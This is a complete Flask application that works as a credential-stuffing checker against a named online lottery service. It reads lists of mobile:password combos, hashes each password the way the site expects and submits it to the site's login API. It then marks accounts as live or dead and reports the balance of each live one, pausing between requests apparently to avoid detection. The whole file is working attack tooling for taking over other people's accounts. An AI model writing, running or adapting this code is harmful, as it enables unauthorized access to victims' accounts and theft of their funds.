from flask import Flask, render_template, request, Response
import requests
import hashlib
import time

app = Flask(__name__)

BASE = "https://mantripk.com/lottery-backend/glserver/user/"

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/check_stream', methods=['POST'])
def check_stream():
    data = request.json
    combos = data.get('combos', '').strip().splitlines()
    
    def generate():
        live = 0
        total = 0
        processed = 0

        # Count valid combos
        valid_combos = [line for line in combos if line and ':' in line]
        total = len(valid_combos)

        yield f"data: {{\"type\":\"start\",\"total\":{total}}}\n\n"

        for line in valid_combos:
            mobile, password = [x.strip() for x in line.split(':', 1)]
            
            mobile = mobile.replace(" ", "").replace("-", "")
            if not mobile.startswith("+91"):
                mobile = "+91" + mobile.lstrip("0")

            hashed = md5(password)
            headers = {"User-Agent": "Mozilla/5.0"}

            params = {"mobile": mobile, "password": hashed}

            status = "ERROR"
            balance = "-"
            remark = "Unknown Error"

            try:
                r = requests.post(BASE + "login", params=params, headers=headers, timeout=12)
                if r.status_code == 200:
                    res = r.json()
                    if res.get("res") == 1:
                        balance = res.get("obj", {}).get("balance", 0)
                        status = "✅ LIVE"
                        live += 1
                        remark = "Success"
                    else:
                        status = "❌ DEAD"
                        remark = res.get("resMsg", "")
                else:
                    status = "❌ DEAD"
                    remark = f"HTTP {r.status_code}"
            except Exception as e:
                remark = str(e)[:80]

            processed += 1
            
            result = {
                "mobile": mobile,
                "status": status,
                "balance": str(balance),
                "remark": remark,
                "progress": processed,
                "total": total,
                "live": live
            }
            
            yield f"data: {result}\n\n"
            time.sleep(4)   # Safe delay

        yield f"data: {{\"type\":\"complete\",\"live\":{live},\"total\":{total}}}\n\n"

    return Response(generate(), mimetype='text/event-stream')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
